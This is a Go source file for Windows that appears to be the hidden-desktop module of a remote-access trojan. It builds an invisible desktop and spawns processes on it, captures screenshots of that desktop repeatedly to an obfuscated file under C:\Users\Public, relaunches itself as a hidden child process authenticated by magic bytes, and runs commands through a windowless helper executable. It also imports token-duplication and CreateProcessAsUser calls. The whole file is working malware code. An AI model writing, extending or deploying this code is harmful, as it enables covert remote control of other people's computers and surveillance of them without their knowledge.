//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var hdIsHost bool

var (
	procWTSQueryUserToken            = syscall.NewLazyDLL("wtsapi32.dll").NewProc("WTSQueryUserToken")
	procDuplicateTokenEx             = syscall.NewLazyDLL("advapi32.dll").NewProc("DuplicateTokenEx")
	procCreateProcessAsUserA         = syscall.NewLazyDLL("advapi32.dll").NewProc("CreateProcessAsUserA")
	procProcessIdToSessionId         = hdKernel32.NewProc("ProcessIdToSessionId")
	procWTSGetActiveConsoleSessionId = hdKernel32.NewProc("WTSGetActiveConsoleSessionId")
	procGetStdHandle                 = hdKernel32.NewProc("GetStdHandle")
	procPeekNamedPipe                = hdKernel32.NewProc("PeekNamedPipe")
	procReadFile                     = hdKernel32.NewProc("ReadFile")
	procWriteFile                    = hdKernel32.NewProc("WriteFile")
)

func hdFilePath() string {
	var serial uint32
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getVol := kernel32.NewProc("GetVolumeInformationA")
	root := append([]byte("C:\\"), 0)
	getVol.Call(uintptr(unsafe.Pointer(&root[0])), 0, 0, uintptr(unsafe.Pointer(&serial)), 0, 0, 0, 0)
	return fmt.Sprintf(`C:\Users\Public\%08x.g2`, serial^0xA73C915E)
}

func readHDFile() string {
	b, err := os.ReadFile(hdFilePath())
	if err != nil || len(b) < 12 || !strings.HasPrefix(string(b), "HDIMG:") {
		return ""
	}
	return string(b)
}

func windowsSession() int {
	var sid uint32
	procProcessIdToSessionId.Call(uintptr(syscall.Getpid()), uintptr(unsafe.Pointer(&sid)))
	return int(sid)
}

func hdTakeHost() bool {
	h, _, _ := procGetStdHandle.Call(^uintptr(0) - 9) // STD_INPUT_HANDLE = -10
	if h == 0 || h == uintptr(^uint(0)) {
		return false
	}
	var mag [4]byte
	var got uint32
	r, _, _ := procPeekNamedPipe.Call(h, uintptr(unsafe.Pointer(&mag[0])), 4, uintptr(unsafe.Pointer(&got)), 0, 0)
	if r == 0 || got < 4 || mag != [4]byte{0xA7, 0x3C, 0x91, 0x5E} {
		return false
	}
	var n uint32
	procReadFile.Call(h, uintptr(unsafe.Pointer(&mag[0])), 4, uintptr(unsafe.Pointer(&n)), 0)
	hdIsHost = true
	return true
}

func hdOwnerLoop() {
	runtime.LockOSThread()
	if err := hdEnsure(); err != nil {
		return
	}
	procSetThreadDesktop.Call(uintptr(hdDesktop))
	hdSpawn(`C:\Windows\System32\notepad.exe`)
	hdMakeWindow()
	hdStarted = true
	for {
		img := hdCapture()
		if strings.HasPrefix(img, "HDIMG:") {
			os.WriteFile(hdFilePath(), []byte(img), 0644)
		}
		time.Sleep(800 * time.Millisecond)
	}
}

func hdHostMain() int {
	hdIsHost = true
	go hdOwnerLoop()
	in, _, _ := procGetStdHandle.Call(^uintptr(0) - 9)
	out, _, _ := procGetStdHandle.Call(^uintptr(0) - 11)
	for {
		var n uint32
		var got uint32
		r, _, _ := procReadFile.Call(in, uintptr(unsafe.Pointer(&n)), 4, uintptr(unsafe.Pointer(&got)), 0)
		if r == 0 || n == 0 || n > 4096 {
			return 0
		}
		buf := make([]byte, n)
		procReadFile.Call(in, uintptr(unsafe.Pointer(&buf[0])), uintptr(n), uintptr(unsafe.Pointer(&got)), 0)
		resp := handleHiddenDesktop(string(buf))
		nb := uint32(len(resp))
		body := []byte(resp)
		procWriteFile.Call(out, uintptr(unsafe.Pointer(&nb)), 4, uintptr(unsafe.Pointer(&got)), 0)
		if nb > 0 {
			procWriteFile.Call(out, uintptr(unsafe.Pointer(&body[0])), uintptr(nb), uintptr(unsafe.Pointer(&got)), 0)
		}
	}
}

func hdViaHost(cmd string) string {
	_ = os.WriteFile(`C:\Users\Public\hdin.txt`, []byte(cmd), 0644)
	_ = os.Remove(`C:\Users\Public\hdout.txt`)
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	cmdLine, _ := syscall.BytePtrFromString(`C:\Users\Public\hdcmdrun.exe`)
	r, _, err := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessA").Call(
		0, uintptr(unsafe.Pointer(cmdLine)), 0, 0, 0, 0x08000000, 0, 0,
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return "desktop host failed " + err.Error()
	}
	for i := 0; i < 750; i++ {
		b, err := os.ReadFile(`C:\Users\Public\hdout.txt`)
		if err == nil && len(b) > 0 {
			return string(b)
		}
		time.Sleep(200 * time.Millisecond)
	}
	return "desktop host failed"
}

var hdToChild, hdFromChild uintptr

var hdWritePipe, hdReadPipe *os.File

func launchHDHost() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	rPipe, wPipe, err := os.Pipe()
	if err != nil {
		return err
	}
	rr, ww, err := os.Pipe()
	if err != nil {
		return err
	}
	if _, err = wPipe.Write([]byte{0xA7, 0x3C, 0x91, 0x5E}); err != nil {
		return err
	}
	cmd := exec.Command(exe)
	cmd.Stdin = rPipe
	cmd.Stdout = ww
	cmd.Stderr = ww
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err = cmd.Start(); err != nil {
		return err
	}
	rPipe.Close()
	ww.Close()
	hdWritePipe = wPipe
	hdReadPipe = rr
	hdToChild = uintptr(syscall.Handle(wPipe.Fd()))
	hdFromChild = uintptr(syscall.Handle(rr.Fd()))
	return nil
}


